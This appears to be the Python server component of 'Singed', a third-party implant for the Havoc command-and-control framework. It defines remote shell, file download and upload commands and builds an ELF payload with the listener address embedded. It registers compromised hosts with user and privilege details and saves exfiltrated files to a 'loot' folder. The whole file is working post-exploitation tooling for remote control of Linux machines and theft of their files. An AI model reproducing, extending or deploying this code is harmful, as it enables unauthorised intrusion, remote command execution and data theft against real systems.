from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import os
import uuid

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_DOWNLOAD         = 0x150
COMMAND_UPLOAD           = 0x151
COMMAND_SHELL            = 0x152
COMMAND_CD               = 0x153
COMMAND_PWD              = 0x154
COMMAND_LS               = 0x155
COMMAND_EXIT             = 0x199
COMMAND_OUTPUT           = 0x200
COMMAND_FILE             = 0x201

# ====================
# ===== Commands =====
# ====================
class CommandDownload(Command):
    CommandId = COMMAND_DOWNLOAD
    Name = "download"
    Description = "downloads remote file"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="filename",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'filename' ] )

        return Task.buffer


class CommandUpload(Command):
    CommandId = COMMAND_UPLOAD
    Name = "upload"
    Description = "uploads local file"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="filename",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        with open(arguments["filename"][:-1], "rb") as f:
            file_bytes = f.read()
            Task.add_data(file_bytes)
    
        Task.add_data( arguments[ 'filename' ] )
        return Task.buffer

class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes shell commands"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="command",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( "/bin/sh -c " + arguments[ 'command' ] )

        return Task.buffer

class CommandCd(Command):
    CommandId = COMMAND_CD
    Name = "cd"
    Description = "changes current working directory"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="directory",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )
        Task.add_data( arguments[ 'directory' ] )

        return Task.buffer

class CommandPwd(Command):
    CommandId = COMMAND_PWD
    Name = "pwd"
    Description = "prints current working directory"
    Help = ""
    NeedAdmin = False
    Params = []
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

class CommandLs(Command):
    CommandId = COMMAND_LS
    Name = "ls"
    Description = "lists files in current directory"
    Help = ""
    NeedAdmin = False
    Params = []
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the singed agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_int( self.CommandId )

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class Singed(AgentType):
    Name = "Singed"
    Author = "@ziggoon"
    Version = "0.1"
    Description = f"""Singed 3rd party agent for Havoc"""
    MagicValue = 1337

    Arch = [
        "ARM",
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "ELF Executable",
            "Extension": "elf",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandDownload(),
        CommandUpload(),
        CommandShell(),
        CommandCd(),
        CommandPwd(),
        CommandLs(),
        CommandExit(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate( self, config: dict ) -> None:

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        build_string = f"SLEEP={config['Config']['Sleep']} IP={config['Options']['Listener']['HostBind']} PORT={config['Options']['Listener']['PortBind']} cargo build --release --manifest-path ../Singed/Cargo.toml --target="
        data = b""

        match config['Options']['Arch']:
            case "ARM":
                os.system("RUSTFLAGS='-C linker=aarch64-linux-gnu-gcc' " + build_string + "aarch64-unknown-linux-gnu")
                data = open("../singed/target/aarch64-unknown-linux-gnu/release/singed", "rb").read()
            case "x86":
                os.system("RUSTFLAGS='-C linker=x86_64-linux-gnu-gcc' " + build_string + "x86_64-unknown-linux-gnu")
                data = open("../singed/target/x86_64-unknown-linux-gnu/release/singed", "rb").read()
            case "x64":
                os.system("RUSTFLAGS='-C linker=i686-linux-gnu-gcc' " + build_string + "i686-unknown-linux-gnu")
                data = open("../singed/target/i686-unknown-linux-gnu/release/singed", "rb").read()
            case _:
                print("error: unknown architecture")

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".elf", data) # this is just an example.

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response( self, response: dict ) -> bytes:
        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        response_parser = Parser( agent_response, len(agent_response) )
        Command         = response_parser.parse_int()

        if response[ "Agent" ] == None:
            # so when the Agent field is empty this either means that the agent doesn't exists.

            if Command == COMMAND_REGISTER:
                print( "[*] Is agent register request" )

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]
                RegisterInfo = {
                    "AgentID"           : response_parser.parse_int(),
                    "Hostname"          : response_parser.parse_str(),
                    "Username"          : response_parser.parse_str(),
                    "InternalIP"        : response_parser.parse_str(),
                    "Process Path"      : response_parser.parse_str(),
                    "Process ID"        : str(response_parser.parse_int()),
                    "Process Parent ID" : str(response_parser.parse_int()),
                    "Process Arch"      : response_parser.parse_str(),
                    "Process Elevated"  : response_parser.parse_int(),
                    "OS Build"        : response_parser.parse_str(),
                    "OS Version"        : response_parser.parse_str(),
                }
            
                self.register( agent_header, RegisterInfo )
                
                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent
            else:
                print( "[-] Is not agent register request" )
        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == COMMAND_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == COMMAND_FILE:
                print( "[*] received downloaded file")

                Output = response_parser.parse_bytes()

                os.makedirs("loot", exist_ok=True)
                
                filename = f"loot/agent_{AgentID}-{uuid.uuid4()}"
                with open(filename, "wb") as f:
                    f.write(Output)

                self.console_message( AgentID, "Good", f"Received uploaded file. Content written to {filename}", "")

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''


def main():
    Havoc_Singed: Singed = Singed()

    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print( "[*] Register Singed to Havoc" )
    Havoc_Service.register_agent(Havoc_Singed)

    return


if __name__ == '__main__':
    main()
